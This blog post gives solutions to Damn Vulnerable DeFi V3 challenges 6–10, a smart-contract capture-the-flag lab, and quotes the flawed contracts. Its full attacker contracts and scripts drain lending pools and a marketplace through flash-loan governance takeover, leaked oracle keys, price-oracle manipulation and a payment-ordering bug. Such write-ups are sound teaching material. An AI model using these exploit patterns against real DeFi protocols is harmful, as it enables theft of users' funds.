---
title: 'Damn Vulnerable Defi V3 Solutions Part 2: 6-10'
date: 2024-01-06T13:55:39+08:00
draft: false
tags: ["ctf"]
---

## Introduction

This series of posts provides solutions for version 3 of Damn Vulnerable DeFi, which includes a total of 15 challenges.

This is the Part 2 of Damn Vulnerable Defi Solution series:
- [Part 1](../damn-vulnerable-defi-v3-solutions-part-1)
- Part 2 (Current)
- [Part 3](../damn-vulnerable-defi-v3-solutions-part-3)

You can find all my solutions and local setup in this [GitHub repository](https://github.com/pkqs90/damn-vulnerable-defi).

This post will focus on solutions for challenges 6-10. These five challenges are primarily centered around flash loans and encompass real-world scenarios. They involve platforms like Uniswap V1 and V2, utilize simple oracles, and also include a simple NFT marketplace.

## Solutions

### 6. Selfie

This challenge features a lending pool that can be drained when executed by the governance contract. Our objective is to manipulate the governance contract, enabling us to redirect the funds to ourselves.

The governance contract evaluates the number of governance tokens (which is the same token offered by the lending pool) held by a user. If a user possesses more than half of the total supply, they can set up an action. However, the flaw lies in the fact that the contract only checks the most recent snapshot, and we have the ability to take snapshots of the token at any time.

```sol
    function _hasEnoughVotes(address who) private view returns (bool) {
        uint256 balance = _governanceToken.getBalanceAtLastSnapshot(who); // <= The governance token only checks for the most recent snapshot.
        uint256 halfTotalSupply = _governanceToken.getTotalSupplyAtLastSnapshot() / 2;
        return balance > halfTotalSupply;
    }
```

So our attack vector would be:
1. Initiate a flash loan.
2. Capture a token snapshot.
3. Set up the desired action in the governance contract.
4. Execute the action after the grace period, which is 2 days.

```sol
contract SelfieAttacker is IERC3156FlashBorrower {

    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    SimpleGovernance governance;
    DamnValuableTokenSnapshot token;
    SelfiePool pool;

    constructor(address _governanceAddr, address _tokenAddr, address _poolAddr) {
        governance = SimpleGovernance(_governanceAddr);
        token = DamnValuableTokenSnapshot(_tokenAddr);
        pool = SelfiePool(_poolAddr);
    }

    function attack() public payable {
        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), token.balanceOf(address(pool)), "");
        bytes memory payload = abi.encodeWithSignature("emergencyExit(address)", msg.sender);
        governance.queueAction(address(pool), 0, payload);
    }

    function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256,
        bytes calldata
    ) external returns (bytes32) {
        token.snapshot();
        token.approve(msg.sender, amount);
        return CALLBACK_SUCCESS;
    }
}

```

### 7. Compromised

This challenge consists of 2 parts. The first part involves an oracle contract controlled by three accounts. The second part is an exchange that uses this oracle to set prices for its NFTs. A direct approach to drain the exchange's funds would be to gain control over the oracle. Once in control, we can manipulate the market by buying at low prices and selling at high prices.

The primary challenge lies in gaining control of the oracle. Fortunately, we are given two hex strings. Upon decoding these, we can find that it results to another base64 encodings. Decoding them a second time reveals that they are actually the private keys of two of the oracle's controlling accounts.

```js
it('Execution', async function () {
    // Decode the hex string.
    const hex0 = '4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35';
    const hex1 = '4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34';
    const base640 = Buffer.from(hex0.split(' ').join(''), 'hex').toString('utf8')
    // MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5
    const base641 = Buffer.from(hex1.split(' ').join(''), 'hex').toString('utf8')
    // MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4
    const privateKey0 = Buffer.from(base640, 'base64').toString('utf8');
    // 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
    const privateKey1 = Buffer.from(base641, 'base64').toString('utf8');
    // 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48

    const signer0 = new ethers.Wallet(privateKey0, ethers.provider);
    const signer1 = new ethers.Wallet(privateKey1, ethers.provider);

    // Change price to 1 wei.
    await oracle.connect(signer0).postPrice('DVNFT', 1);
    await oracle.connect(signer1).postPrice('DVNFT', 1);

    // Buy NFT.
    await exchange.connect(player).buyOne({value: 1});

    // Change price to exchange balance (to drain all eth).
    const exchangeBalance = ethers.provider.getBalance(exchange.address);
    await oracle.connect(signer0).postPrice('DVNFT', exchangeBalance);
    await oracle.connect(signer1).postPrice('DVNFT', exchangeBalance);

    // Sell NFT.
    await nftToken.connect(player).approve(exchange.address, 0);
    await exchange.connect(player).sellOne(0);

    // Change price back to initial value.
    await oracle.connect(signer0).postPrice('DVNFT', EXCHANGE_INITIAL_ETH_BALANCE);
    await oracle.connect(signer1).postPrice('DVNFT', EXCHANGE_INITIAL_ETH_BALANCE);
});

```

### 8. Puppet

This challenge consists of two parts: a lending pool and a Uniswap V1 exchange. The lending protocol relies on the most recent Uniswap price as an oracle to determine the necessary collateral amount. It's important to note that Uniswap has limited liquidity, with only 10 ETH and 10 DVT tokens in its pool. This means we can influence Uniswap's price by exchanging a large amount of DVT for ETH. This action will significantly reduce the DVT/ETH price, ultimately enabling us to deplete the lending pool using a relatively small amount of ETH.

To figure out how to swap tokens for ETH, we can refer to the [Uniswap V1 documentation](https://docs.uniswap.org/contracts/v1/reference/interfaces).

```sol
contract PuppetAttacker {

    IERC20 token;
    PuppetPool pool;
    IUniswapExchange exchange;

    constructor(address _tokenAddr, address _poolAddr, address _exchangeAddr) payable {
        token = IERC20(_tokenAddr);
        pool = PuppetPool(_poolAddr);
        exchange = IUniswapExchange(_exchangeAddr);
    }

    function attack(address user) public payable {
        // Swap all users token for eth to severely decrease price of DVT.
        uint256 playerInitialTokenAmount = token.balanceOf(address(this));
        token.approve(address(exchange), playerInitialTokenAmount);
        exchange.tokenToEthSwapInput(playerInitialTokenAmount, 1, block.timestamp + 1);

        // Borrow all DVT from pool.
        uint256 poolInitialTokenAmount = token.balanceOf(address(pool));
        pool.borrow{value: address(this).balance}(poolInitialTokenAmount, user);

        // Send back remaining eth.
        (bool success, ) = payable(user).call{value: address(this).balance}("");
        require(success, "Failed to transfer eth");
    }

    receive() external payable {}
}

```

The takeaway from this challenge is to avoid using a single timestamp price from an oracle, as they can be easily manipulated. Even with sufficient liquidity, the use of a flash loan can still allow for significant price distortion.

### 9. Puppet V2

This challenge is essentially similar to the previous one, with the primary difference being its use of Uniswap V2. Although the challenge states that the lending pool utilizes Uniswap V2's recommended utility library, it actually only employs `UniswapV2Library.quote()`, which calculates just the pair's current price. Consequently, our approach to exploit this setup would be the same as in the last challenge.

A more effective oracle solution would involve using a time-weighted average price (which Uniswap V2 provides), as this approach makes it more challenging to manipulate the price.

```js
it('Execution', async function () {
    // Though this lendingPool uses uniswapv2 library, it is still using the pair's current price
    // instead of time-averaging it. Thus we can perform an oracle attack to drain the pool.

    // 1. Swap all of user's token to WETH to bring down token/WETH pair price.
    await token.connect(player).approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE);
    await uniswapRouter.connect(player).swapExactTokensForTokens(
        PLAYER_INITIAL_TOKEN_BALANCE,
        0,
        [token.address, weth.address],
        player.address,
        (await ethers.provider.getBlock('latest')).timestamp * 2
    );

    // 2. User has close to 20 ETH after spending gas fee on the swapping on uniswap.
    await weth.connect(player).deposit({value: ethers.utils.parseEther("19.9")});

    // 3. Borrow all of lendingPool's token.
    const wethRequired = BigInt(await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE));
    await weth.connect(player).approve(lendingPool.address, wethRequired)
    await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE);
});
```

### 10. Free Rider

This challenge consists of 3 parts:
1. An NFT Marketplace, which is our target for hacking.
2. A recovery contract, to which we aim to transfer the hacked NFTs in order to claim our prize.
3. A Uniswap V2 Exchange.

By reading through the contract code, we can find two severe bugs in the marketplace:
1. The `buyMany()` function is designed to accept ETH only once, yet it allows this single payment to cover all selected NFTs.
2. The `_buyOne()` function pays the NFT owner AFTER the token has been transferred to the buyer, effectively enabling the buyer to acquire it at no cost.

```sol
function buyMany(uint256[] calldata tokenIds) external payable nonReentrant {
    for (uint256 i = 0; i < tokenIds.length;) {
        unchecked {
            _buyOne(tokenIds[i]); // <= Buy all the tokenIds[] while only paying for one.
            ++i;
        }
    }
}

function _buyOne(uint256 tokenId) private {
    uint256 priceToPay = offers[tokenId];
    if (priceToPay == 0)
        revert TokenNotOffered(tokenId);

    if (msg.value < priceToPay)
        revert InsufficientPayment();

    --offersCount;

    // transfer from seller to buyer
    DamnValuableNFT _token = token; // cache for gas savings
    _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);

    // pay seller using cached token
    payable(_token.ownerOf(tokenId)).sendValue(priceToPay); // <= This line is literally just paying back the buyer what he just spent.

    emit NFTBought(msg.sender, tokenId, priceToPay);
}
```

Our strategy for the attack is straightforward: we only need 15 ETH to mint all the NFTs for free. Initially, we don't possess that much ETH, but fortunately, there's a Uniswap V2 Exchange available, where we can execute a flash loan. Thus, our final exploit would proceed as follows:

```sol
contract FreeRiderAttacker is ReentrancyGuard, IERC721Receiver {

    FreeRiderNFTMarketplace marketplace;
    FreeRiderRecovery recovery;
    IUniswapV2Pair pair;
    address player;

    constructor(address payable addr1, address addr2, address addr3) payable {
        marketplace = FreeRiderNFTMarketplace(addr1);
        recovery = FreeRiderRecovery(addr2);
        pair = IUniswapV2Pair(addr3);
        player = msg.sender;
    }

    function attack() public payable {
        // We loan 15 ether amount of WETH from uniswapv2, then perform the attack in callback function `uniswapV2Call`.
        pair.swap(15 ether, 0, address(this), "0x11");
    }

    // EIP721 requires NFT receive contracts to implement this function for safety.
    function onERC721Received(address, address, uint256, bytes memory) external override nonReentrant returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    function uniswapV2Call(address, uint amount0, uint, bytes calldata) external {
        // Withdraw all WETH to ETH. We should have over 15 ETH to buy from NFTMarketPlace.
        WETH weth = WETH(payable(pair.token0()));
        weth.withdraw(amount0);
        // Buy NFTs.
        uint256[] memory tokenIds = new uint256[](6);
        for (uint i = 0; i < 6; ++i) {
            tokenIds[i] = i;
        }
        marketplace.buyMany{value: 15 ether}(tokenIds);
        // Send NFTs to recovery contract to claim bounty.
        DamnValuableNFT token = marketplace.token();
        bytes memory payload = abi.encode(player);
        for (uint i = 0; i < 6; ++i) {
            token.safeTransferFrom(address(this), address(recovery), i, payload);
        }
        // Return back the loan along with the fee.
        uint256 fee = amount0 * 3 / 997 + 1;
        uint256 repayAmount = fee + amount0;
        weth.deposit{value: repayAmount}();
        assert(weth.transfer(msg.sender, repayAmount));
    }

    // Do not forget this, as receive function is required for receiving eth.
    receive() external payable {}
}
```